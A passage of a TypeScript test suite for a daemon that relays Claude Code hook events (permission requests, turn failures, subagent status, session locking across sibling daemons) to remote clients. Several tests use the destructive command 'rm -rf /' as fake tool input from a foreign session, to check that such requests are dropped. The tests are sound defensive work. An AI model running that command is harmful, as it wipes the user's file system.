          hookServer.fire('Stop', stop({ session_id: 'claude-OTHER' }));
          await flush();

          expect(dismissals(sent)).toEqual([]);
        });

        test('a retry loop at a usage limit alerts once: no dismiss, no second alert (#1226)', async () => {
          const { sent, outcomes } = wire(new Map([['wants', TOKEN_ENTRY('wants')]]));
          lock('claude-A');
          hookServer.fire('StopFailure', stopFailure());
          await Promise.all(outcomes);

          // Each retry fails again at once.
          for (let i = 0; i < 5; i++) {
            hookServer.fire('UserPromptSubmit', prompt());
            hookServer.fire('StopFailure', stopFailure({ prompt_id: `retry-${i}` }));
          }
          await Promise.all(outcomes);
          await flush();

          expect(sent.map((p) => p.opts['kind'])).toEqual(['turn_failed']);
        });

        test('subagents failing at the same limit alert once between them, and the main agent once more (#1226)', async () => {
          const { sent, outcomes } = wire(new Map([['wants', TOKEN_ENTRY('wants')]]));
          lock('claude-A');

          hookServer.fire(
            'StopFailure',
            stopFailure({ agent_id: 'agent-1', agent_type: 'Explore' }),
          );
          hookServer.fire(
            'StopFailure',
            stopFailure({ agent_id: 'agent-2', agent_type: 'Explore' }),
          );
          hookServer.fire('StopFailure', stopFailure());
          hookServer.fire('StopFailure', stopFailure({ prompt_id: 'again' }));
          await Promise.all(outcomes);
          await flush();

          expect(sent.map((p) => p.opts['kind'])).toEqual(['turn_failed', 'turn_failed']);
          expect(String(sent[0]?.opts['body'])).toStartWith('Explore · ');
          expect(String(sent[1]?.opts['body'])).toStartWith('Rate or usage limit reached');
        });

        const toolCall = (over: Record<string, unknown> = {}) => ({
          session_id: 'claude-A',
          hook_event_name: 'PreToolUse',
          tool_name: 'Read',
          tool_input: { file_path: '/tmp/x' },
          tool_use_id: 'toolu_progress',
          ...over,
        });

        test('the main agent working again clears the notice, so the same failure later alerts (#1226)', async () => {
          // A resumed turn that runs for hours and then hits the limit again
          // must be heard: no Stop came in between.
          const { sent, outcomes } = wire(new Map([['wants', TOKEN_ENTRY('wants')]]));
          lock('claude-A');
          hookServer.fire('StopFailure', stopFailure());
          await Promise.all(outcomes);

          hookServer.fire('UserPromptSubmit', prompt());
          hookServer.fire('PreToolUse', toolCall());
          hookServer.fire('StopFailure', stopFailure({ prompt_id: 'later' }));
          await Promise.all(outcomes);
          await flush();

          expect(sent.map((p) => p.opts['kind'])).toEqual([
            'turn_failed',
            'dismiss',
            'turn_failed',
          ]);
        });

        test("a subagent's tool call does not clear the main agent's notice (#1226)", async () => {
          const { sent, outcomes } = wire(new Map([['wants', TOKEN_ENTRY('wants')]]));
          lock('claude-A');
          hookServer.fire('StopFailure', stopFailure());
          await Promise.all(outcomes);

          hookServer.fire('PreToolUse', toolCall({ agent_id: 'agent-1', agent_type: 'Explore' }));
          hookServer.fire('StopFailure', stopFailure({ prompt_id: 'again' }));
          await Promise.all(outcomes);
          await flush();

          expect(sent.map((p) => p.opts['kind'])).toEqual(['turn_failed']);
        });

        test('after a turn that finishes well, the same failure alerts again (#1226)', async () => {
          const { sent, outcomes } = wire(new Map([['wants', TOKEN_ENTRY('wants')]]));
          lock('claude-A');
          hookServer.fire('StopFailure', stopFailure());
          await Promise.all(outcomes);

          hookServer.fire('Stop', stop());
          hookServer.fire('StopFailure', stopFailure());
          await Promise.all(outcomes);
          await flush();

          expect(sent.map((p) => p.opts['kind'])).toEqual([
            'turn_failed',
            'dismiss',
            'turn_failed',
          ]);
          expect(new Set(sent.map((p) => p.opts['questionId']))).toEqual(
            new Set([turnFailedCollapseId(SID)]),
          );
        });

        test('a throwing dismissal sink never escapes into the hook dispatch loop', () => {
          build({
            dismissTurnFailed: () => {
              throw new Error('test: dismiss sink exploded');
            },
          });
          lock('claude-A');
          expect(() => hookServer.fire('Stop', stop())).not.toThrow();
          expect(() => hookServer.fire('UserPromptSubmit', prompt())).not.toThrow();
        });
      });

      test('a device that muted turnFailed gets nothing, and the fan-out reports no_channel', async () => {
        const { sent, outcomes } = wire(
          new Map([
            [
              'muted',
              TOKEN_ENTRY('muted', {
                questions: true,
                turnComplete: true,
                harnessDenied: true,
                turnFailed: false,
              }),
            ],
          ]),
        );
        lock('claude-A');
        hookServer.fire('StopFailure', stopFailure());

        expect(await Promise.all(outcomes)).toEqual(['no_channel']);
        expect(sent).toEqual([]);
      });
    });

    test('PostToolUseFailure sets executing status (main); a subagent failure is dropped', () => {
      build();
      lock('claude-A');
      hookServer.fire('PostToolUseFailure', {
        session_id: 'claude-A',
        tool_name: 'Bash',
        error: 'exit 1',
      });
      expect(messageApiLog.statusCalls).toEqual(['executing']);

      // A subagent's tool failure (agent_id set) must NOT flip main's status.
      messageApiLog.statusCalls.length = 0;
      hookServer.fire('PostToolUseFailure', {
        session_id: 'claude-A',
        agent_id: 'sub-1',
        tool_name: 'Bash',
        error: 'exit 1',
      });
      expect(messageApiLog.statusCalls).toEqual([]);
    });

    test('SubagentStart/Stop set the status breadcrumb (admit-gated, NOT agent_id-dropped)', () => {
      build();
      lock('claude-A');
      // SubagentStart/Stop ALWAYS carry agent_id; they must NOT be dropped.
      hookServer.fire('SubagentStart', {
        session_id: 'claude-A',
        agent_id: 'sub-1',
        agent_type: 'code-architect',
      });
      expect(messageApiLog.statusCalls).toEqual(['executing']);

      messageApiLog.statusCalls.length = 0;
      hookServer.fire('SubagentStop', { session_id: 'claude-A', agent_id: 'sub-1' });
      expect(messageApiLog.statusCalls).toEqual(['thinking']);
    });

    test('SubagentStart for a FOREIGN session_id is dropped by the admit gate', () => {
      build();
      lock('claude-A');
      hookServer.fire('SubagentStart', {
        session_id: 'claude-OTHER',
        agent_id: 'sub-1',
        agent_type: 'task',
      });
      expect(messageApiLog.statusCalls).toEqual([]);
    });
  });

  test('builds without throwing', () => {
    expect(() => build()).not.toThrow();
  });

  test('#807: an agent_id-tagged PermissionRequest passes through unevaluated even with the PTY prompt visible', async () => {
    // History: pre-phase-4 these events were dropped at the listener boundary;
    // #419 demoted agent_id to metadata and let the LLM evaluate them, gating
    // only the PTY inject on presence.
    //
    // #807 removes the evaluation entirely. The hook is answered before Claude
    // renders anything, so PTY presence at THIS moment says nothing about
    // whether this particular prompt will render — the visible prompt here may
    // well belong to another agent. So the answer is 'passthrough' regardless,
    // and Claude's own permission flow decides. A card only appears if the
    // parked record later pairs with a real render.
    const { tracker } = build();

    hookServer.fire('Notification', {
      session_id: 'claude-sub-123',
      transcript_path: path.join(tmpDir, 'sub.jsonl'),
      hook_event_name: 'Notification',
      notification_type: 'auth_success',
      message: '',
    });

    // PTY rendered the subagent's prompt on the user's screen.
    tracker.onPTYPromptVisible({
      id: 'pty-pr1',
      text: 'Allow Bash?',
      options: [],
      allowsFreeText: false,
      isAnswered: false,
    });

    const decision = await hookServer.firePermission({
      session_id: 'claude-sub-123',
      agent_id: 'subagent-abc',
      agent_type: 'task',
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
    });

    // #807: never evaluated. Passthrough, nothing typed into the PTY.
    expect(decision).toBe('passthrough');
    expect(ptySubmits).toEqual([]);
  });

  test('#710 regression: PostToolUse(Task) tagged with the spawned agent_id still pops the tracker', () => {
    // The leak: PreToolUse(Task) fires untagged (main context) and tracks
    // tool_use_id X. Claude Code may stamp the Task's OWN completion
    // PostToolUse with the spawned agent's agent_id. Pre-fix, the PostToolUse
    // listener's `if (isSubagentEvent(input)) return;` dropped that event
    // BEFORE it reached handlers.onPostToolUse -> handlePostToolUse -> the
    // tracker pop, so X was never popped and isInSubagentContext() stuck true
    // forever. Post-fix, the subagent-tagged drop path pops via
    // hookBridge.noteSubagentToolEnd() before returning.
    build();
    const bridge = bridgeHandles[bridgeHandles.length - 1]?.bridge;
    if (!bridge) throw new Error('test setup: no bridge handle');

    hookServer.fire('Notification', {
      session_id: 'claude-leak-1',
      transcript_path: path.join(tmpDir, 'leak.jsonl'),
      hook_event_name: 'Notification',
      notification_type: 'auth_success',
      message: '',
    });

    hookServer.fire('PreToolUse', {
      session_id: 'claude-leak-1',
      hook_event_name: 'PreToolUse',
      tool_name: 'Task',
      tool_use_id: 'tu_leak_1',
      tool_input: { prompt: 'spawn subagent' },
    });
    expect(bridge.isInSubagentContext()).toBe(true);

    // The Task's own completion event arrives tagged with the spawned agent's
    // agent_id (the observed 0.6.18-dev.24 soak shape) — NOT untagged as the
    // matching PreToolUse was.
    hookServer.fire('PostToolUse', {
      session_id: 'claude-leak-1',
      hook_event_name: 'PostToolUse',
      agent_id: 'spawned-agent-1',
      tool_name: 'Task',
      tool_use_id: 'tu_leak_1',
      tool_input: {},
      tool_response: { result: 'done' },
    });

    expect(bridge.isInSubagentContext()).toBe(false);
  });

  test('regression #321: sibling daemon dying re-enables hook lock acquisition AND filterBySession recovers', () => {
    // Pre-seed a sibling entry so the first hook event sees siblings present.
    const siblingFile = path.join(liveSessionsRegistry.dirPath, 'sibling-1.json');
    fs.mkdirSync(liveSessionsRegistry.dirPath, { recursive: true });
    fs.writeFileSync(
      siblingFile,
      JSON.stringify({
        sessionId: 'sibling-session-id',
        pid: process.pid, // alive (must be a live pid so listLive doesn't drop it)
        wsPort: 18999, // different from currentPort()=8765
        hookPort: 18000,
        projectPath: tmpDir, // SAME directory as our session under test
        name: 'sibling',
        startedAt: new Date().toISOString(),
      }),
    );

    build();

    // First hook event arrives while sibling exists -> must NOT lock onto
    // claude-A; events are deferred to the mtime fallback. PreToolUse during
    // this window must also be filtered out (the headline #321 symptom: the
    // auto-approve log and status updates went missing; #1125 removed the
    // evaluator, the filter stays).
    hookServer.fire('Notification', {
      session_id: 'claude-A',
      transcript_path: path.join(tmpDir, 'a.jsonl'),
      hook_event_name: 'Notification',
      notification_type: 'auth_success',
      message: '',
    });
    expect(transcriptWatchers.has(SID)).toBe(false);

    hookServer.fire('PreToolUse', {
      session_id: 'claude-A',
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
    });
    // filterBySession with no lock + sibling => drops everything; status
    // never advances. This was the user-visible failure in #321.
    expect(messageApiLog.statusCalls).toEqual([]);

    // Sibling daemon dies (file removed).
    fs.unlinkSync(siblingFile);

    // Next hook event must now lock onto claude-A and start the watcher.
    // Pre-#321-fix: the cached `hasSiblingInDir=true` from the first call
    // permanently blocked init even after the sibling was gone.
    hookServer.fire('Notification', {
      session_id: 'claude-A',
      transcript_path: path.join(tmpDir, 'a.jsonl'),
      hook_event_name: 'Notification',
      notification_type: 'auth_success',
      message: '',
    });
    expect(transcriptWatchers.has(SID)).toBe(true);

    // And filterBySession must now accept further events. PreToolUse maps to
    // 'executing' via HookEventBridge.handleStatusChange.
    hookServer.fire('PreToolUse', {
      session_id: 'claude-A',
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
    });
    expect(messageApiLog.statusCalls).toContain('executing');
  });

  test('regression #321: sibling appearing after lock acquisition does not re-engage the guard', () => {
    // Once we hold a session lock, a sibling daemon spinning up later must
    // not flip filterBySession into the pre-lock branch and start dropping
    // events. claudeSessionId-based filtering takes precedence.
    build();

    // Acquire the lock cleanly with no siblings present.
    hookServer.fire('Notification', {
      session_id: 'claude-A',
      transcript_path: path.join(tmpDir, 'a.jsonl'),
      hook_event_name: 'Notification',
      notification_type: 'auth_success',
      message: '',
    });
    expect(transcriptWatchers.has(SID)).toBe(true);

    // A sibling appears now (e.g. user opens another remi in the same dir).
    fs.writeFileSync(
      path.join(liveSessionsRegistry.dirPath, 'late-sibling.json'),
      JSON.stringify({
        sessionId: 'late-sibling-id',
        pid: process.pid,
        wsPort: 18999,
        hookPort: 18000,
        projectPath: tmpDir,
        name: 'late-sibling',
        startedAt: new Date().toISOString(),
      }),
    );

    // Our own Claude's events must still flow through filterBySession because
    // session_id matches claudeSessionId; the sibling guard never reads.
    hookServer.fire('PreToolUse', {
      session_id: 'claude-A',
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
    });
    expect(messageApiLog.statusCalls).toContain('executing');
  });

  test('sibling-in-dir + fallback-discovered claudeSessionId: lock adopted from sessionStore on next hook', async () => {
    // The dev.3 inconsistency the user hit: when 2+ Remi wrappers share a
    // project directory, hasSiblingInDir() defers hook-event-based locking
    // to the transcript-fallback poll. The fallback discovers our own
    // Claude session ID by inspecting `~/.claude/projects/<dir>/` and writes
    // it to sessionStore. Pre-fix, the hook-bridge's `claudeSessionId`
    // closure never read from sessionStore, so filterBySession kept
    // returning false (no lock + siblings) and dropped EVERY hook for the
    // entire session lifetime. The fix: adoptLockFromStore() reads
    // sessionStore.findByRemiSessionId(...)?.claudeSessionId lazily on the
    // next hook event after fallback completes.
    //
    // Test setup: seed a sibling and pre-populate sessionStore as the
    // fallback would have done. Fire a PermissionRequest for our session
    // and assert it is escalated as a question (proving filterBySession
    // adopted the lock).
    fs.mkdirSync(liveSessionsRegistry.dirPath, { recursive: true });
    fs.writeFileSync(
      path.join(liveSessionsRegistry.dirPath, 'sibling-in-dir.json'),
      JSON.stringify({
        sessionId: 'sibling-session-id',
        pid: process.pid,
        wsPort: 18999,
        hookPort: 18001,
        projectPath: tmpDir,
        name: 'sibling',
        startedAt: new Date().toISOString(),
      }),
    );

    // Pre-populate the store as transcript-fallback would have done after
    // discovering our Claude transcript via filesystem polling.
    sessionStore.save({
      remiSessionId: SID,
      claudeSessionId: 'claude-mine-via-fallback',
      projectPath: tmpDir,
      port: 8765,
      pid: process.pid,
      startedAt: new Date().toISOString(),
      exitedAt: null,
      exitCode: null,
    });

    const { handle } = build();

    // The first hook arrives WHILE hasSiblingInDir is still true. Pre-fix
    // this dropped silently. Post-fix, adoptLockFromStore pulls the lock
    // from sessionStore and filterBySession returns true.
    // If the lock was adopted, the event is admitted and the gate escalates
    // it, emitting a question and holding the hook (#1126). If not
    // (regression), it is dropped as foreign: 'passthrough' at once, with no
    // question. So the emitted question proves adoption.
    const decision = hookServer.firePermission({
      session_id: 'claude-mine-via-fallback',
      hook_event_name: 'PermissionRequest',
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
    });
    expect(messageApiLog.questionCalls).toBe(1);
    handle.gate.forceRelease('test');
    expect(await decision).toBe('passthrough');
    expect(ptySubmits).toEqual([]);
  });

  test("sibling-in-dir + fallback-discovered lock: foreign session's hooks still drop", () => {
    // Mirror of the test above, but with a hook event from a DIFFERENT
    // session_id (i.e. the sibling's Claude). Lock-adoption must not turn
    // into "accept anything"; the adopted lock should be enforced like
    // the normal locked path.
    fs.mkdirSync(liveSessionsRegistry.dirPath, { recursive: true });
    fs.writeFileSync(
      path.join(liveSessionsRegistry.dirPath, 'sibling-in-dir-2.json'),
      JSON.stringify({
        sessionId: 'sibling-session-id-2',
        pid: process.pid,
        wsPort: 18998,
        hookPort: 18002,
        projectPath: tmpDir,
        name: 'sibling-2',
        startedAt: new Date().toISOString(),
      }),
    );

    sessionStore.save({
      remiSessionId: SID,
      claudeSessionId: 'claude-mine-v2',
      projectPath: tmpDir,
      port: 8765,
      pid: process.pid,
      startedAt: new Date().toISOString(),
      exitedAt: null,
      exitCode: null,
    });

    build();

    // Foreign session_id — sibling's Claude firing through our hook URL.
    hookServer.fire('PermissionRequest', {
      session_id: 'claude-sibling-not-ours',
      hook_event_name: 'PermissionRequest',
      tool_name: 'Bash',
      tool_input: { command: 'rm -rf /' },
    });

    return new Promise<void>((resolve) => {
      setTimeout(() => {
        // No inject — filterBySession matched on the adopted lock and
        // dropped the foreign event.
        expect(ptySubmits).toEqual([]);
        resolve();
      }, 50);
    });
  });

  describe('#672 foreignSessionEscalator wiring', () => {
    function bindOurSession(): void {
      sessionStore.save({
        remiSessionId: SID,
        claudeSessionId: 'claude-mine',
        projectPath: tmpDir,
        port: 8765,
        pid: process.pid,
        startedAt: new Date().toISOString(),
        exitedAt: null,
        exitCode: null,
      });
    }

    test('calls handleUnadmitted with the raw input + our sessionId when a PermissionRequest is NOT admitted', async () => {
      bindOurSession();
      const foreignEscalationLog: Array<{ input: unknown; sessionId: UUID }> = [];
      build({ foreignEscalationLog });

      const input = {
        session_id: 'claude-someone-else',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'rm -rf /' },
      };
      const decision = await hookServer.firePermission(input);

      expect(decision).toBe('passthrough');
      expect(foreignEscalationLog).toHaveLength(1);
      expect(foreignEscalationLog[0]?.sessionId).toBe(SID);
      expect(foreignEscalationLog[0]?.input).toMatchObject({ session_id: 'claude-someone-else' });
    });

    test('does NOT call handleUnadmitted when the PermissionRequest IS admitted (our own session)', async () => {
      bindOurSession();
      const foreignEscalationLog: Array<{ input: unknown; sessionId: UUID }> = [];
      const { handle } = build({ foreignEscalationLog });

      const decision = hookServer.firePermission({
        session_id: 'claude-mine',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'ls' },
      });

      // Admitted: the gate escalated it (a question was emitted) and holds
      // the hook (#1126).
      expect(messageApiLog.questionCalls).toBe(1);
      expect(foreignEscalationLog).toHaveLength(0);
      handle.gate.forceRelease('test');
      expect(await decision).toBe('passthrough');
    });

    test('with no foreignSessionEscalator wired, a foreign PermissionRequest still passes through cleanly (no throw)', async () => {
      bindOurSession();
      build(); // no foreignEscalationLog -> dep left unwired

      const decision = await hookServer.firePermission({
        session_id: 'claude-someone-else',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'rm -rf /' },
      });

      expect(decision).toBe('passthrough');
    });
  });

  test('sibling-in-dir + sessionStore rotation: adoptLockFromStore re-adopts the new claudeSessionId', async () => {
    // After initial adoption from sessionStore (claude-A), the user runs
    // /clear in the sibling-wrapper scenario. The transcript-fallback
    // rediscovers and writes claude-B to the store. The hook-bridge MUST
    // pick up the rotation; pre-fix, the `if (claudeSessionId !== null)
    // return` short-circuit blocked the re-read and every hook for
    // claude-B was silently dropped.
    fs.mkdirSync(liveSessionsRegistry.dirPath, { recursive: true });
    fs.writeFileSync(
      path.join(liveSessionsRegistry.dirPath, 'sibling-rotate.json'),
      JSON.stringify({
        sessionId: 'sibling-session-id-rotate',
        pid: process.pid,
        wsPort: 18997,
        hookPort: 18003,
        projectPath: tmpDir,
        name: 'sibling-rotate',
        startedAt: new Date().toISOString(),
      }),
    );

    sessionStore.save({
      remiSessionId: SID,
      claudeSessionId: 'claude-A-initial',
      projectPath: tmpDir,
      port: 8765,
      pid: process.pid,
      startedAt: new Date().toISOString(),
      exitedAt: null,
      exitCode: null,
    });

    const { handle } = build();

    // Initial adoption: hook for claude-A is admitted -> escalated, so the
    // gate emits a question (a dropped foreign hook emits none) and holds.
    const first = hookServer.firePermission({
      session_id: 'claude-A-initial',
      hook_event_name: 'PermissionRequest',
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
    });
    expect(messageApiLog.questionCalls).toBe(1);

    // Fallback rediscovers after /clear and writes the new id.
    sessionStore.save({
      remiSessionId: SID,
      claudeSessionId: 'claude-B-rotated',
      projectPath: tmpDir,
      port: 8765,
      pid: process.pid,
      startedAt: new Date().toISOString(),
      exitedAt: null,
      exitCode: null,
    });

    // Hook for claude-B: the lock must re-adopt; otherwise it is dropped as
    // foreign with no question. A second question proves the rotation was
    // picked up.
    const second = hookServer.firePermission({
      session_id: 'claude-B-rotated',
      hook_event_name: 'PermissionRequest',
      tool_name: 'Bash',
      tool_input: { command: 'pwd' },
    });
    expect(messageApiLog.questionCalls).toBe(2);
    handle.gate.forceRelease('test');
    expect(await first).toBe('passthrough');
    expect(await second).toBe('passthrough');
    expect(ptySubmits).toEqual([]);
  });

  test('a rotation with no SessionEnd (a port-marker reclaim) still releases a live hold: the rotation sweep itself (#1126)', async () => {
    // The usual rotation arrives after a SessionEnd, whose own sweep would
    // hide a missing rotation sweep. A stale-lock reclaim (#518) rotates
    // with nothing else firing: an event for an unknown id whose transcript
    // carries OUR port marker.
    const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
    build({ realMessageApi: true, broadcastResolvedLog });
    hookServer.fire('Notification', {
      session_id: 'claude-sweep-A',
      transcript_path: path.join(tmpDir, 'sweep-a.jsonl'),
      hook_event_name: 'Notification',
      notification_type: 'auth_success',
      message: '',
    });
    let settled = false;
    const first = hookServer
      .firePermission({
        session_id: 'claude-sweep-A',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'ls' },
      })
      .then((d) => {
        settled = true;
        return d;
      });
    const card = [...(sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [])][0];
    if (!card) throw new Error('no held card');
    const transcriptB = path.join(tmpDir, 'sweep-b.jsonl');
    fs.writeFileSync(
      transcriptB,
      `${JSON.stringify({ type: 'custom-title', customTitle: 'remi:8765' })}\n`,
    );
    hookServer.fire('Notification', {
      session_id: 'claude-sweep-B',
      transcript_path: transcriptB,
      hook_event_name: 'Notification',
      notification_type: 'auth_success',
      message: '',
    });
    expect(await first).toBe('passthrough');
    expect(settled).toBe(true);
    expect(broadcastResolvedLog.map((r) => r.questionId)).toContain(card.id);
    expect(sessionRegistry.getSession(SID)?.currentQuestions.size ?? 0).toBe(0);
  });

  test('adoptLockFromStore catches sessionStore throws and keeps the daemon running', () => {
    // EMFILE / permissions / mid-write JSON.parse failures inside
    // sessionStore.read can throw out of findByRemiSessionId. Pre-fix
    // those propagated into the hook dispatch loop. The try/catch wrapper
    // must contain them: log via logError and fall through to the
    // existing sibling-guard path (claudeSessionId stays null, hooks
    // drop until siblings clear).
    fs.mkdirSync(liveSessionsRegistry.dirPath, { recursive: true });
    fs.writeFileSync(
      path.join(liveSessionsRegistry.dirPath, 'sibling-throw.json'),
      JSON.stringify({
        sessionId: 'sibling-session-id-throw',
        pid: process.pid,
        wsPort: 18996,
        hookPort: 18004,
        projectPath: tmpDir,
        name: 'sibling-throw',
        startedAt: new Date().toISOString(),
      }),
    );

    // Replace findByRemiSessionId with one that throws to simulate
    // EMFILE-class failures from fs.readFileSync inside SessionStore.read.
    sessionStore.findByRemiSessionId = () => {
      throw Object.assign(new Error('test: EMFILE'), { code: 'EMFILE' });
    };

    build();

    // Fire a hook — this triggers adoptLockFromStore which would throw.
    // We expect the hook dispatch to survive (no thrown exception, hook
    // is filtered out because the closure remains null + sibling present).
    expect(() =>
      hookServer.fire('PermissionRequest', {
        session_id: 'claude-throw-test',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'ls' },
      }),
    ).not.toThrow();

    return new Promise<void>((resolve) => {
      setTimeout(() => {
        // No inject — sibling is present and adoptLockFromStore could not
        // resolve a lock, so filterBySession's `!hasSiblingInDir()` arm
        // returns false. The daemon stays alive instead of crashing.
        expect(ptySubmits).toEqual([]);
        resolve();
      }, 50);
    });
  });

  test('restart (/clear) broadcasts question_resolved for each pending question and clears them (#585 P7)', () => {
    const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
    build({ broadcastResolvedLog });

    // Lock onto claude-A.
    hookServer.fire('Notification', {
      session_id: 'claude-A',
      transcript_path: path.join(tmpDir, 'a.jsonl'),
      hook_event_name: 'Notification',
      notification_type: 'auth_success',
      message: '',
    });

    // A question was pushed before the restart (held-hook or hook+PTY path).
    const QID = 'q1111111-1111-1111-1111-111111111111' as UUID;
    sessionRegistry.addQuestion(SID, {
      id: QID,
      text: 'proceed?',
      options: [
        { value: 'y', label: 'Yes', isRecommended: true, isYes: true, isNo: false },
        { value: 'n', label: 'No', isRecommended: false, isYes: false, isNo: true },
      ],
      allowsFreeText: false,
      isAnswered: false,
    });
    expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(1);

    // /clear: a new session_id rotates the binding (restart classification).
    // #930: SessionStart's own pre-empt is unreachable via hooks now (Claude
    // Code never sends it), so the rotation here is driven the way it
    // actually happens post-#930: a real SessionEnd for the OLD id flips
    // `mainSessionEnded` (`TranscriptBinder.onSessionEnd`), then any
    // registered event for the NEW id classifies as 'restart'. This is
    // real production behavior (SessionEnd genuinely fires on a clean exit),
    // not a synthetic-only substitute.
    hookServer.fire('SessionEnd', {
      session_id: 'claude-A',
      hook_event_name: 'SessionEnd',
      reason: 'clear',
    });
    hookServer.fire('Notification', {
      session_id: 'claude-B',
      transcript_path: path.join(tmpDir, 'b.jsonl'),
      hook_event_name: 'Notification',
      notification_type: 'auth_success',
      message: '',
    });

    // The pending card is dismissed on every client (broadcast) AND dropped from
    // the registry, so nothing lingers across the rotation.
    expect(broadcastResolvedLog).toEqual([{ questionId: QID, reason: 'cancelled' }]);
    expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(0);
  });

  // -------------------------------------------------------------------------
  // Phase 3 (#418) replaced the pre-emptive `lastPermissionEmitAt` dedup
  // window (#377/#379/#381) and the `PendingAck` inject timer (#382) with
  // QuestionPresenceTracker — see
  // packages/daemon/src/api/question-presence-tracker.ts and its tests.
  // Those windows/timers no longer exist, so the associated regression
  // tests were removed in this cleanup. Tracker semantics are validated
  // structurally in question-presence-tracker.test.ts.
  // -------------------------------------------------------------------------

  test('Phase 3 wiring: PreToolUse drives tracker.onStatusChange (the observed prompt clears)', () => {
    // A subsequent PreToolUse must drive tracker.onStatusChange('executing')
    // through the bridge's onStatusChange wiring. Without it, a refactor
    // that disconnects tracker.onStatusChange from the bridge would leave
    // the screen observation stale, and the answer guards would read a
    // prompt as still on screen after Claude moved past it.
    const { tracker } = build({ realTracker: true });

    hookServer.fire('Notification', {
      session_id: 'claude-locked-wire-1',
      hook_event_name: 'Notification',
      transcript_path: path.join(tmpDir, 'wire.jsonl'),
      notification_type: 'auth_success',
      message: '',
    });
    tracker.onOrphanPTYPrompt(parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question);
    expect(tracker.isPromptObservedOnPTY()).toBe(true);

    hookServer.fire('PreToolUse', {
      session_id: 'claude-locked-wire-1',
      hook_event_name: 'PreToolUse',
      tool_name: 'Edit',
      tool_input: { file_path: '/tmp/x.ts' },
    });

    expect(tracker.isPromptObservedOnPTY()).toBe(false);
  });

  test('a held prompt leaves no pending record: its card is pushed at hook time (#1126)', () => {
    const pushLog: Array<{ question: Question; held: boolean }> = [];
    const { tracker, handle } = build({ realTracker: true, pushLog });
    hookServer.fire('Notification', {
      session_id: 'claude-locked-wire-2',
      hook_event_name: 'Notification',
      transcript_path: path.join(tmpDir, 'wire2.jsonl'),
      notification_type: 'auth_success',
      message: '',
    });
    hookServer.fire('PermissionRequest', {
      session_id: 'claude-locked-wire-2',
      hook_event_name: 'PermissionRequest',
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
    });
    expect(tracker.hasPendingForTest()).toBe(false);
    expect(pushLog).toHaveLength(1);
    expect(pushLog[0]?.held).toBe(true);
    handle.gate.forceRelease('test');
  });

  test('Phase 3 wiring: SessionStart restart clears tracker.pending', () => {
    // Cross-phase regression: phase 1's restart classifier tears down
    // the transcript watcher. Without explicit tracker.clearPending(),
    // a PermissionRequest stashed before /clear or /compact would
    // merge stale option labels onto the new session's first PTY
    // prompt. Two reviewers flagged this on PR #423.
    const { tracker } = build({ realTracker: true });

    hookServer.fire('Notification', {
      session_id: 'claude-restart-A',
      hook_event_name: 'Notification',
      transcript_path: path.join(tmpDir, 'a.jsonl'),
      notification_type: 'auth_success',
      message: '',
    });

    // A parked subagent prompt is the record that waits in `pending` (a
    // main prompt's card is pushed at hook time, #1126).
    hookServer.fire('PermissionRequest', {
      session_id: 'claude-restart-A',
      hook_event_name: 'PermissionRequest',
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
      agent_id: 'agent-restart',
      agent_type: 'general-purpose',
    });

    expect(tracker.hasPendingForTest()).toBe(true);

    // Restart fires (e.g. user typed /clear). #930: SessionStart's own
    // pre-empt is unreachable via hooks now, so the rotation is driven the
    // way it actually happens post-#930: a real SessionEnd for the OLD id
    // flips `mainSessionEnded`, then any registered event for the NEW id
    // classifies as 'restart' (see the (#585 P7) test above for the same
    // substitution and its rationale).
    hookServer.fire('SessionEnd', {
      session_id: 'claude-restart-A',
      hook_event_name: 'SessionEnd',
      reason: 'clear',
    });
    hookServer.fire('Notification', {
      session_id: 'claude-restart-B',
      hook_event_name: 'Notification',
      transcript_path: path.join(tmpDir, 'b.jsonl'),
      notification_type: 'auth_success',
      message: '',
    });

    expect(tracker.hasPendingForTest()).toBe(false);
  });

  test('Phase 3 wiring: late Notification after SessionEnd is dropped', () => {
    // silent-failure-hunter #3: SessionEnd already cleared status to
    // 'idle' (which drains tracker.pending). A late Notification
    // arriving from a dying Claude process must not re-populate the
    // pending slot, or a final PTY echo could fire a spurious push.
    const { tracker } = build({ realTracker: true });

    hookServer.fire('Notification', {
      session_id: 'claude-late-1',
      hook_event_name: 'Notification',
      transcript_path: path.join(tmpDir, 'late.jsonl'),
      notification_type: 'auth_success',
      message: '',
    });

    hookServer.fire('SessionEnd', {
      session_id: 'claude-late-1',
      hook_event_name: 'SessionEnd',
      reason: 'logout',
    });

    // Late Notification fires after teardown.
    hookServer.fire('Notification', {
      session_id: 'claude-late-1',
      hook_event_name: 'Notification',
      notification_type: 'permission_prompt',
      message: 'phantom prompt from dying Claude',
    });

    expect(tracker.hasPendingForTest()).toBe(false);
  });

  test('mixed-shape suggestions: a held card is built by meaning, pushed at once, never from the screen (#1126)', async () => {
    // pr-test-analyzer Gap 3, end to end through the real bridge wiring.
    // Since #1126 a binary card is answered through its held hook, so its
    // options come from the suggestions by meaning, never from the screen,
    // and the dialog's render is not merged into it.
    const pushed: Question[] = [];
    const localApi = fakeMessageAPI(messageApiLog);
    sessionRegistry.registerSession(SID, tmpDir, fakePTY(ptySubmits), localApi);
    const tracker = new QuestionPresenceTracker((q) => {
      pushed.push(q);
      return undefined;
    });

    const handle = setupHookBridge(
      {
        sessionRegistry,
        bindingStore,
        liveSessionsRegistry,
        transcriptWatchers: transcriptWatchers as unknown as Map<
          UUID,
          import('../../../src/transcript/transcript-watcher.ts').TranscriptWatcher
        >,
        transcriptFallbackTimers,
